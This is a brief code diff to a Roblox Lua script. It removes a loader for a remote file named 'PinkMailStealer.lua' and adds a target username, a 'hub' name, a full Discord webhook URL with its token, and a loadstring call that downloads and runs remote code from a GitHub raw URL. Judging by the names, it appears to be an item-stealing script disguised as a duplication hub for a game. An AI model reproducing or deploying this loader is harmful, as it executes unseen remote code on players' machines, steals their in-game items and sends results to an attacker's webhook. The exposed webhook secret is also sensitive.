@@ -1,3 +1,5 @@
-_G.Name = "Loading Script"
 _G.Username = "ARDAAABAAABBBBBAAA"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkMailStealer.lua", true))()
+_G.HubName = "ARDAhub"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1096354722698502194/9CpDCz1dySQm26vDxk05DO-rhe-pn8RMHniymUkg5zfFN_VJYQ5B9e-u7F3sJoUSr4lt"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
